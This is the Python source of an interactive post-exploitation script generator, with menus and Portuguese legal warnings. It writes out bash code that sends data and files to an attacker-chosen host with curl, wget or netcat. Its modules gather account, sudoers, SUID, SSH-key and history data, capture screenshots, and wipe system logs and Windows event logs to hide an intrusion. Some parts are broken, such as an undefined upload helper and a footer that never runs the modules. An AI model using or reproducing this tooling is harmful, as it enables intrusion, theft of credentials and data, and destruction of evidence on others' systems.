#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import base64
import hashlib
from typing import Dict, List, Optional
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress
from rich.text import Text
from rich.syntax import Syntax
import pygments
from pygments.lexers import BashLexer
from pygments.formatters import TerminalFormatter

console = Console()

class PostExploitGen:
    def __init__(self):
        self.modules = {
            'system_info': {
                'function': self.gen_system_info,
                'description': 'Coleta informações detalhadas do sistema',
                'os': ['linux', 'windows']
            },
            'priv_esc': {
                'function': self.gen_priv_esc,
                'description': 'Técnicas de escalação de privilégio',
                'os': ['linux', 'windows']
            },
            'network_scan': {
                'function': self.gen_network_scan,
                'description': 'Varredura de rede e portas',
                'os': ['linux', 'windows']
            },
            'screenshot': {
                'function': self.gen_screenshot,
                'description': 'Captura de tela (GUI apenas)',
                'os': ['linux', 'windows']
            },
            'history': {
                'function': self.gen_history,
                'description': 'Coleta histórico de comandos',
                'os': ['linux', 'windows']
            },
            'clean_tracks': {
                'function': self.gen_clean_tracks,
                'description': 'Limpeza de logs e rastros',
                'os': ['linux', 'windows']
            }
        }
        
        self.c2_options = {
            'metasploit': {
                'config': self.config_metasploit,
                'description': 'Conexão com Metasploit Framework'
            },
            'netcat': {
                'config': self.config_netcat,
                'description': 'Conexão via Netcat'
            },
            'http': {
                'config': self.config_http,
                'description': 'Servidor HTTP personalizado'
            }
        }
        
        self.banners = [
            self._generate_banner_1(),
            self._generate_banner_2(),
            self._generate_banner_3()
        ]
        
        self.current_config = {
            'os': None,
            'c2_type': None,
            'c2_params': {},
            'modules': []
        }

    def _generate_banner_1(self) -> str:
        return """
  _____ _____ _____ _____ _____ _____ _____ 
 |_____|_____|_____|_____|_____|_____|_____|
 |  _  |  _  |  _  |  _  |  _  |  _  |  _  |
 | |_| | |_| | |_| | |_| | |_| | |_| | |_| |
 |_____|_____|_____|_____|_____|_____|_____|
 |_____ _____ _____ _____ _____ _____ _____|
 |  _  |  _  |  _  |  _  |  _  |  _  |  _  |
 | |_| | |_| | |_| | |_| | |_| | |_| | |_| |
 |_____|_____|_____|_____|_____|_____|_____|
[bold red]       POST-EXPLOITATION FRAMEWORK v2.0[/bold red]
"""

    def _generate_banner_2(self) -> str:
        return """
  ____  ____  ____  ____  ____  ____  ____ 
 ||P ||||O ||||S ||||T ||||E ||||X ||||P ||
 ||__||||__||||__||||__||||__||||__||||__||
 |/__\||/__\||/__\||/__\||/__\||/__\||/__\|
  ____  ____  ____  ____  ____  ____  ____ 
 ||L ||||O ||||I ||||T ||||A ||||T ||||I ||
 ||__||||__||||__||||__||||__||||__||||__||
 |/__\||/__\||/__\||/__\||/__\||/__\||/__\|
[bold yellow]       ADVANCED POST-EXPLOITATION TOOL[/bold yellow]
"""

    def _generate_banner_3(self) -> str:
        return """
  _______ _______ _______ _______ _______ 
 |   |   |   |   |   |   |   |   |   |   |
 |   |   |   |   |   |   |   |   |   |   |
 |___|___|___|___|___|___|___|___|___|___|
  _______ _______ _______ _______ _______ 
 |   |   |   |   |   |   |   |   |   |   |
 |   |   |   |   |   |   |   |   |   |   |
 |___|___|___|___|___|___|___|___|___|___|
[bold blue]       POST-EXPLOIT GENERATOR v3.1[/bold blue]
"""

    def show_banner(self):
        console.print(random.choice(self.banners))
        console.print(Panel.fit(
            "[blink bold red]⚠️ ATENÇÃO: USO ILEGAL É CRIME! USE APENAS PARA TESTES AUTORIZADOS ⚠️[/blink bold red]",
            style="red on black"
        ))
        time.sleep(1)

    def main_menu(self):
        while True:
            console.clear()
            self.show_banner()
            
            table = Table(title="[bold cyan]MAIN MENU[/bold cyan]", show_header=True, header_style="bold magenta")
            table.add_column("Option", style="cyan", width=10)
            table.add_column("Description", style="green")
            
            table.add_row("1", "Set target OS")
            table.add_row("2", "Configure C2")
            table.add_row("3", "Select modules")
            table.add_row("4", "Generate script")
            table.add_row("5", "Show config")
            table.add_row("0", "Exit")
            
            console.print(table)
            
            choice = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Select an option",
                choices=["0", "1", "2", "3", "4", "5"],
                show_choices=False
            )
            
            if choice == "1":
                self.config_target_os()
            elif choice == "2":
                self.config_c2_menu()
            elif choice == "3":
                self.select_modules_menu()
            elif choice == "4":
                self.generate_script()
            elif choice == "5":
                self.show_config()
            elif choice == "0":
                self.exit_tool()

    def config_target_os(self):
        console.clear()
        console.print(Panel.fit("[bold]TARGET OS CONFIGURATION[/bold]", border_style="blue"))
        
        table = Table(show_header=False)
        table.add_row("1", "Linux")
        table.add_row("2", "Windows")
        table.add_row("0", "Back")
        console.print(table)
        
        choice = Prompt.ask(
            "[blink yellow]➤[/blink yellow] Select target OS",
            choices=["0", "1", "2"],
            show_choices=False
        )
        
        if choice == "1":
            self.current_config['os'] = 'linux'
            console.print("[green]✓ Target OS set to Linux[/green]")
        elif choice == "2":
            self.current_config['os'] = 'windows'
            console.print("[green]✓ Target OS set to Windows[/green]")
        
        time.sleep(1)

    def config_c2_menu(self):
        while True:
            console.clear()
            console.print(Panel.fit("[bold]COMMAND & CONTROL CONFIG[/bold]", border_style="blue"))
            
            table = Table(title="C2 Options", show_header=True, header_style="bold magenta")
            table.add_column("ID", style="cyan", width=5)
            table.add_column("Type", style="green")
            table.add_column("Description")
            
            for i, (name, data) in enumerate(self.c2_options.items(), 1):
                table.add_row(str(i), name, data['description'])
            
            table.add_row("0", "Back", "Return to main menu")
            console.print(table)
            
            choice = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Select C2 type",
                choices=[str(i) for i in range(0, len(self.c2_options)+1)],
                show_choices=False
            )
            
            if choice == "0":
                return
            
            c2_type = list(self.c2_options.keys())[int(choice)-1]
            self.current_config['c2_type'] = c2_type
            self.c2_options[c2_type]['config']()
            break

    def config_metasploit(self):
        console.print("\n[bold]Metasploit Configuration[/bold]")
        self.current_config['c2_params'] = {
            'lhost': Prompt.ask("[yellow]?[/yellow] Listener IP", default="192.168.1.100"),
            'lport': IntPrompt.ask("[yellow]?[/yellow] Listener port", default=4444),
            'payload': Prompt.ask(
                "[yellow]?[/yellow] Payload type", 
                default="meterpreter/reverse_tcp",
                choices=[
                    "meterpreter/reverse_tcp",
                    "meterpreter/reverse_http",
                    "meterpreter/reverse_https",
                    "shell/reverse_tcp"
                ]
            )
        }
        console.print("[green]✓ Metasploit config saved[/green]")
        time.sleep(1)

    def config_netcat(self):
        console.print("\n[bold]Netcat Configuration[/bold]")
        self.current_config['c2_params'] = {
            'lhost': Prompt.ask("[yellow]?[/yellow] Connect back IP", default="192.168.1.100"),
            'lport': IntPrompt.ask("[yellow]?[/yellow] Connect back port", default=4444),
            'protocol': Prompt.ask(
                "[yellow]?[/yellow] Protocol", 
                default="tcp",
                choices=["tcp", "udp"]
            )
        }
        console.print("[green]✓ Netcat config saved[/green]")
        time.sleep(1)

    def config_http(self):
        console.print("\n[bold]HTTP Server Configuration[/bold]")
        self.current_config['c2_params'] = {
            'url': Prompt.ask("[yellow]?[/yellow] Server URL (ex: http://192.168.1.100:8080)"),
            'auth_key': Prompt.ask("[yellow]?[/yellow] Authentication key (optional)", default=""),
            'encryption': Confirm.ask("[yellow]?[/yellow] Use encryption?", default=True)
        }
        console.print("[green]✓ HTTP config saved[/green]")
        time.sleep(1)

    def select_modules_menu(self):
        if not self.current_config['os']:
            console.print("[red]✗ First set target OS[/red]")
            time.sleep(1)
            return
        
        while True:
            console.clear()
            console.print(Panel.fit("[bold]SELECT MODULES[/bold]", border_style="blue"))
            
            available_modules = {k: v for k, v in self.modules.items() 
                               if self.current_config['os'] in v['os']}
            
            table = Table(title="Available Modules", show_header=True, header_style="bold magenta")
            table.add_column("ID", style="cyan", width=5)
            table.add_column("Module", style="green")
            table.add_column("Description")
            table.add_column("Selected", style="yellow")
            
            for i, (name, data) in enumerate(available_modules.items(), 1):
                selected = "✓" if name in self.current_config['modules'] else "✗"
                table.add_row(str(i), name, data['description'], selected)
            
            table.add_row("0", "Back", "Return to main menu", "")
            console.print(table)
            
            choice = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Select modules (comma separated or 'all')",
                default="0"
            )
            
            if choice == "0":
                return
            elif choice.lower() == "all":
                self.current_config['modules'] = list(available_modules.keys())
                console.print("[green]✓ All modules selected[/green]")
            else:
                selected = []
                for num in choice.split(','):
                    try:
                        module_name = list(available_modules.keys())[int(num)-1]
                        selected.append(module_name)
                    except (ValueError, IndexError):
                        pass
                
                self.current_config['modules'] = selected
                console.print(f"[green]✓ {len(selected)} module(s) selected[/green]")
            
            time.sleep(1)

    def show_config(self):
        console.clear()
        console.print(Panel.fit("[bold]CURRENT CONFIGURATION[/bold]", border_style="blue"))
        
        table = Table(show_header=False)
        table.add_row("Target OS:", f"[cyan]{self.current_config['os'] or 'Not set'}[/cyan]")
        
        if self.current_config['c2_type']:
            table.add_row("C2 Type:", f"[cyan]{self.current_config['c2_type']}[/cyan]")
            for k, v in self.current_config['c2_params'].items():
                table.add_row(f"  {k}:", f"[green]{v}[/green]")
        else:
            table.add_row("C2:", "[red]Not configured[/red]")
        
        if self.current_config['modules']:
            table.add_row("Modules:", "\n".join(
                f"[yellow]• {m}[/yellow]" for m in self.current_config['modules'])
            )
        else:
            table.add_row("Modules:", "[red]No modules selected[/red]")
        
        console.print(table)
        input("\nPress Enter to continue...")

    def generate_script(self):
        if not all([self.current_config['os'], self.current_config['c2_type'], self.current_config['modules']]):
            console.print("[red]✗ Incomplete config! Set OS, C2 and modules[/red]")
            time.sleep(2)
            return
        
        console.clear()
        console.print(Panel.fit("[bold]GENERATE SCRIPT[/bold]", border_style="blue"))
        
        filename = Prompt.ask(
            "[yellow]?[/yellow] Output filename",
            default=f"post_exploit_{self.current_config['os']}.sh"
        )
        
        with Progress() as progress:
            task = progress.add_task("[cyan]Generating script...[/cyan]", total=100)
            
            # Generate header
            script = self._generate_script_header()
            progress.update(task, advance=10)
            
            # Generate C2 functions
            c2_func = getattr(self, f"gen_c2_{self.current_config['c2_type']}")
            script += c2_func()
            progress.update(task, advance=20)
            
            # Generate selected modules
            for module in self.current_config['modules']:
                script += self.modules[module]['function']()
                progress.update(task, advance=70/len(self.current_config['modules']))
            
            # Generate footer and main
            script += self._generate_script_footer()
            progress.update(task, completed=100)
        
        # Save file
        try:
            with open(filename, 'w') as f:
                f.write(script)
            
            # Calculate hashes
            with open(filename, 'rb') as f:
                md5 = hashlib.md5(f.read()).hexdigest()
                sha256 = hashlib.sha256(f.read()).hexdigest()
            
            # Show preview
            console.print("\n[bold]Preview:[/bold]")
            console.print(Syntax(script[:500], "bash", line_numbers=True))
            console.print(f"[yellow]... (truncated for preview)[/yellow]")
            
            # Show info
            console.print(Panel.fit(
                f"[green]✓ Script generated successfully![/green]\n"
                f"Filename: [bold]{filename}[/bold]\n"
                f"Size: [bold]{len(script)}[/bold] bytes\n"
                f"MD5: [bold]{md5}[/bold]\n"
                f"SHA256: [bold]{sha256}[/bold]",
                title="[bold green]SUCCESS[/bold green]",
                border_style="green"
            ))
            
            console.print("\n[bold]Instructions:[/bold]")
            if self.current_config['os'] == 'linux':
                console.print(f"[cyan]chmod +x {filename} && ./{filename}[/cyan]")
            else:
                console.print(f"[cyan]Can be executed as bash script on Windows (requires Git Bash/WSL)[/cyan]")
            
        except Exception as e:
            console.print(Panel.fit(
                f"[red]✗ Error generating script: {str(e)}[/red]",
                title="[bold red]ERROR[/bold red]",
                border_style="red"
            ))
        
        input("\nPress Enter to continue...")

    def _generate_script_header(self) -> str:
        banner = r"""
==================================================
=                POST-EXPLOITATION               =
=                  FRAMEWORK v2.0                =
==================================================
=    Automated Post-Exploitation Script          =
=    Generated on: {time}    =
==================================================
""".format(time=time.strftime("%Y-%m-%d %H:%M:%S"))
        
        header = f"""#!/bin/bash
{banner}

# Configuration
OS="{self.current_config['os']}"
C2_TYPE="{self.current_config['c2_type']}"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Logging
LOG_FILE="/tmp/post_exploit.log"
echo "=== Post-Exploitation Script Started ===" > $LOG_FILE
date >> $LOG_FILE

function log() {{
    echo -e "${{YELLOW}}[$(date '+%H:%M:%S')] $1${{NC}}"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> $LOG_FILE
}}

function send_data() {{
    # Function to send data to C2
    local data="$1"
    log "Sending data to C2: $data"
    
"""
        return header

    def gen_c2_metasploit(self) -> str:
        params = self.current_config['c2_params']
        return f"""
    # Metasploit C2 communication
    MSF_IP="{params['lhost']}"
    MSF_PORT="{params['lport']}"
    PAYLOAD="{params['payload']}"
    
    function msf_send() {{
        local data="$1"
        if command -v curl &>/dev/null; then
            curl -s -X POST "http://$MSF_IP:$MSF_PORT/data" -d "$data"
        elif command -v wget &>/dev/null; then
            wget -q -O - "http://$MSF_IP:$MSF_PORT/data" --post-data="$data"
        else
            echo "No HTTP client found for C2 communication"
        fi
    }}
    
    function msf_upload() {{
        local file="$1"
        if [ ! -f "$file" ]; then
            log "File not found: $file"
            return
        fi
        
        if command -v curl &>/dev/null; then
            curl -s -X POST "http://$MSF_IP:$MSF_PORT/upload" -F "file=@$file"
        elif command -v wget &>/dev/null; then
            wget -q -O - "http://$MSF_IP:$MSF_PORT/upload" --post-file="$file"
        else
            echo "No HTTP client found for file upload"
        fi
    }}
"""

    def gen_c2_netcat(self) -> str:
        params = self.current_config['c2_params']
        return f"""
    # Netcat C2 communication
    NC_IP="{params['lhost']}"
    NC_PORT="{params['lport']}"
    PROTOCOL="{params['protocol']}"
    
    function nc_send() {{
        local data="$1"
        if command -v nc &>/dev/null; then
            echo "$data" | nc -w 3 ${{PROTOCOL:+-u}} "$NC_IP" "$NC_PORT"
        else
            echo "Netcat not found for C2 communication"
        fi
    }}
    
    function nc_upload() {{
        local file="$1"
        if [ ! -f "$file" ]; then
            log "File not found: $file"
            return
        fi
        
        if command -v nc &>/dev/null; then
            base64 "$file" | nc -w 3 ${{PROTOCOL:+-u}} "$NC_IP" "$NC_PORT"
        else
            echo "Netcat not found for file upload"
        fi
    }}
"""

    def gen_c2_http(self) -> str:
        params = self.current_config['c2_params']
        return f"""
    # HTTP C2 communication
    HTTP_URL="{params['url']}"
    AUTH_KEY="{params['auth_key']}"
    USE_ENCRYPTION="{params['encryption']}"
    
    function http_send() {{
        local data="$1"
        if [ "$USE_ENCRYPTION" = "true" ]; then
            data=$(echo "$data" | openssl enc -e -aes-256-cbc -salt -pass pass:"$AUTH_KEY" -base64 2>/dev/null)
        fi
        
        if command -v curl &>/dev/null; then
            curl -s -X POST "$HTTP_URL/data" -H "Authorization: $AUTH_KEY" -d "$data"
        elif command -v wget &>/dev/null; then
            wget -q -O - "$HTTP_URL/data" --header="Authorization: $AUTH_KEY" --post-data="$data"
        else
            echo "No HTTP client found for C2 communication"
        fi
    }}
    
    function http_upload() {{
        local file="$1"
        if [ ! -f "$file" ]; then
            log "File not found: $file"
            return
        fi
        
        if [ "$USE_ENCRYPTION" = "true" ]; then
            local enc_file="/tmp/$(basename "$file").enc"
            openssl enc -e -aes-256-cbc -salt -pass pass:"$AUTH_KEY" -in "$file" -out "$enc_file"
            file="$enc_file"
        fi
        
        if command -v curl &>/dev/null; then
            curl -s -X POST "$HTTP_URL/upload" -H "Authorization: $AUTH_KEY" -F "file=@$file"
        elif command -v wget &>/dev/null; then
            wget -q -O - "$HTTP_URL/upload" --header="Authorization: $AUTH_KEY" --post-file="$file"
        else
            echo "No HTTP client found for file upload"
        fi
        
        [ "$USE_ENCRYPTION" = "true" ] && rm -f "$enc_file"
    }}
"""

    def gen_system_info(self) -> str:
        return """
function collect_system_info() {
    log "Collecting system information..."
    
    local info="=== SYSTEM INFORMATION ===\\n"
    info+="Hostname: $(hostname)\\n"
    info+="OS: $(uname -a)\\n"
    info+="Kernel: $(uname -r)\\n"
    
    if [ "$OS" = "linux" ]; then
        info+="\\n=== LINUX SPECIFIC ===\\n"
        info+="Distro: $(cat /etc/*-release 2>/dev/null | grep PRETTY_NAME | cut -d'=' -f2 | tr -d '\"')\\n"
        info+="Users: $(cat /etc/passwd | cut -d: -f1 | tr '\\n' ' ')\\n"
        info+="Sudoers: $(grep -v '^#' /etc/sudoers 2>/dev/null | grep -v '^$')\\n"
    else
        info+="\\n=== WINDOWS SPECIFIC ===\\n"
        info+="OS Version: $(cmd.exe /c ver 2>/dev/null)\\n"
        info+="Current User: $(whoami)\\n"
        info+="Local Users: $(net user | grep -v 'The command completed')\\n"
    fi
    
    info+="\\n=== NETWORK INFO ===\\n"
    info+="IP Addresses: $(ip a 2>/dev/null || ifconfig 2>/dev/null)\\n"
    info+="Routing Table: $(ip r 2>/dev/null || route print 2>/dev/null)\\n"
    info+="ARP Table: $(ip n 2>/dev/null || arp -a 2>/dev/null)\\n"
    
    info+="\\n=== DISK INFO ===\\n"
    info+="Disk Usage: $(df -h 2>/dev/null || wmic logicaldisk get size,freespace,caption 2>/dev/null)\\n"
    info+="Mounted Filesystems: $(mount 2>/dev/null)\\n"
    
    send_data "$info"
}
"""

    def gen_priv_esc(self) -> str:
        return """
function privilege_escalation() {
    log "Attempting privilege escalation..."
    
    local result="=== PRIVILEGE ESCALATION ATTEMPTS ===\\n"
    
    if [ "$OS" = "linux" ]; then
        # Common Linux privilege escalation vectors
        result+="\\nSUID Files:\\n$(find / -perm -4000 -type f 2>/dev/null)\\n"
        result+="\\nWritable Files:\\n$(find / -perm -o+w -type f 2>/dev/null | head -n 50)\\n"
        result+="\\nCron Jobs:\\n$(crontab -l 2>/dev/null; ls -la /etc/cron* 2>/dev/null)\\n"
        result+="\\nCapabilities:\\n$(getcap -r / 2>/dev/null)\\n"
        
        # Try known exploits
        result+="\\nKernel Version:\\n$(uname -a)\\n"
        result+="\\nPossible Exploits:\\n"
        result+="DirtyCow: $(grep -i 'linux 3.' /proc/version 2>/dev/null && echo 'Possible' || echo 'Unlikely')\\n"
        result+="Sudo Version: $(sudo -V 2>/dev/null | head -n1)\\n"
    else
        # Windows privilege escalation
        result+="\\nUser Privileges:\\n$(whoami /priv 2>/dev/null)\\n"
        result+="\\nInstalled Software:\\n$(wmic product get name,version 2>/dev/null)\\n"
        result+="\\nServices:\\n$(net start 2>/dev/null)\\n"
        result+="\\nScheduled Tasks:\\n$(schtasks /query /fo LIST 2>/dev/null)\\n"
    fi
    
    # Try to get root/admin
    if [ "$OS" = "linux" ]; then
        if sudo -n true 2>/dev/null; then
            result+="\\n[SUCCESS] User has passwordless sudo access!\\n"
        elif [ -w /etc/sudoers ]; then
            result+="\\n[SUCCESS] /etc/sudoers is writable!\\n"
        else
            result+="\\n[FAILURE] No obvious privilege escalation found\\n"
        fi
    else
        if net localgroup administrators | grep -q "$(whoami)"; then
            result+="\\n[SUCCESS] User is in Administrators group!\\n"
        else
            result+="\\n[FAILURE] Not in Administrators group\\n"
        fi
    fi
    
    send_data "$result"
}
"""

    def gen_network_scan(self) -> str:
        return """
function network_scan() {
    log "Performing network scan..."
    
    local result="=== NETWORK SCAN RESULTS ===\\n"
    
    if [ "$OS" = "linux" ]; then
        # Linux network scanning
        result+="\\nLocal Network:\\n$(ip route 2>/dev/null)\\n"
        result+="\\nARP Table:\\n$(ip neigh 2>/dev/null || arp -a 2>/dev/null)\\n"
        
        if command -v nmap &>/dev/null; then
            result+="\\nNmap Quick Scan:\\n$(nmap -sn $(ip route | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+/\\d+' 2>/dev/null) 2>/dev/null)\\n"
        elif command -v netdiscover &>/dev/null; then
            result+="\\nNetdiscover Results:\\n$(netdiscover -r $(ip route | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+/\\d+' 2>/dev/null) 2>/dev/null)\\n"
        else
            result+="\\nPing Sweep:\\n"
            for ip in $(seq 1 254); do
                ping -c 1 "$(ip route | grep -oP '\\d+\\.\\d+\\.\\d+').$ip" | grep "bytes from" | cut -d" " -f4 &
            done | sort -u >> "$(mktemp)" && cat "$(mktemp)" && rm -f "$(mktemp)"
        fi
    else
        # Windows network scanning
        result+="\\nNetwork Configuration:\\n$(ipconfig /all 2>/dev/null)\\n"
        result+="\\nARP Table:\\n$(arp -a 2>/dev/null)\\n"
        
        if command -v nmap &>/dev/null; then
            result+="\\nNmap Quick Scan:\\n$(nmap -sn $(ipconfig | findstr "IPv4" | awk '{print $NF}' | cut -d. -f1-3).0/24 2>/dev/null)\\n"
        else
            result+="\\nPing Sweep:\\n"
            for ip in $(seq 1 254); do
                ping -n 1 -w 100 "$(ipconfig | findstr "IPv4" | awk '{print $NF}' | cut -d. -f1-3).$ip" | findstr "Reply" &
            done | sort -u >> "$(mktemp)" && type "$(mktemp)" && del "$(mktemp)"
        fi
    fi
    
    send_data "$result"
}
"""

    def gen_screenshot(self) -> str:
        return """
function take_screenshot() {
    log "Attempting to take screenshot..."
    
    if [ "$OS" = "linux" ]; then
        if command -v import &>/dev/null; then
            # Using ImageMagick
            import -window root /tmp/screenshot.png
            [ -f "/tmp/screenshot.png" ] && upload_file "/tmp/screenshot.png" && rm -f "/tmp/screenshot.png"
        elif command -v gnome-screenshot &>/dev/null; then
            gnome-screenshot -f /tmp/screenshot.png
            [ -f "/tmp/screenshot.png" ] && upload_file "/tmp/screenshot.png" && rm -f "/tmp/screenshot.png"
        else
            log "No screenshot tool available"
        fi
    else
        # Windows screenshot
        if command -v nircmd &>/dev/null; then
            nircmd savescreenshot /tmp/screenshot.png
            [ -f "/tmp/screenshot.png" ] && upload_file "/tmp/screenshot.png" && rm -f "/tmp/screenshot.png"
        else
            powershell -command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{PRTSC}'); Start-Sleep -Seconds 1; \$image = [System.Windows.Forms.Clipboard]::GetImage(); \$image.Save('/tmp/screenshot.png');"
            [ -f "/tmp/screenshot.png" ] && upload_file "/tmp/screenshot.png" && rm -f "/tmp/screenshot.png"
        fi
    fi
}
"""

    def gen_history(self) -> str:
        return """
function collect_history() {
    log "Collecting command history..."
    
    local result="=== COMMAND HISTORY ===\\n"
    
    if [ "$OS" = "linux" ]; then
        result+="\\nBash History:\\n$(cat ~/.bash_history 2>/dev/null | tail -n 50)\\n"
        result+="\\nCurrent User's History:\\n$(history 2>/dev/null | tail -n 50)\\n"
        result+="\\nSSH Keys:\\n$(find / -name 'id_rsa*' -o -name '*.pem' 2>/dev/null)\\n"
    else
        result+="\\nCommand Prompt History:\\n$(doskey /history 2>/dev/null)\\n"
        result+="\\nPowerShell History:\\n$(type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>/dev/null)\\n"
        result+="\\nRecent Files:\\n$(dir /a %userprofile%\\Recent 2>/dev/null)\\n"
    fi
    
    send_data "$result"
}
"""

    def gen_clean_tracks(self) -> str:
        return """
function clean_tracks() {
    log "Cleaning tracks..."
    
    if [ "$OS" = "linux" ]; then
        # Clear bash history
        [ -f ~/.bash_history ] && cat /dev/null > ~/.bash_history
        history -c
        
        # Remove log entries
        find /var/log -type f -exec cp /dev/null {} \;
        
        # Remove temporary files
        rm -rf /tmp/* /var/tmp/*
    else
        # Clear Windows logs
        wevtutil cl System >nul 2>&1
        wevtutil cl Security >nul 2>&1
        wevtutil cl Application >nul 2>&1
        
        # Clear recent files
        del /f /q %userprofile%\\Recent\\* >nul 2>&1
    fi
    
    log "Tracks cleaned"
}
"""

    def _generate_script_footer(self) -> str:
        return """
# Main execution
log "Starting post-exploitation modules"

# Execute selected modules
"""

    def exit_tool(self):
        console.print(Panel.fit(
            "[blink bold red]⚠️ ATENÇÃO: USO ILEGAL É CRIME! ⚠️[/blink bold red]",
            border_style="red"
        ))
        console.print("[cyan]Saindo...[/cyan]")
        time.sleep(1)
        sys.exit(0)

def main():
    try:
        generator = PostExploitGen()
        generator.main_menu()
    except KeyboardInterrupt:
        console.print("\n[red]✗ Cancelado[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]✗ Erro: {str(e)}[/red]")
        sys.exit(1)

if __name__ == '__main__':
    main()
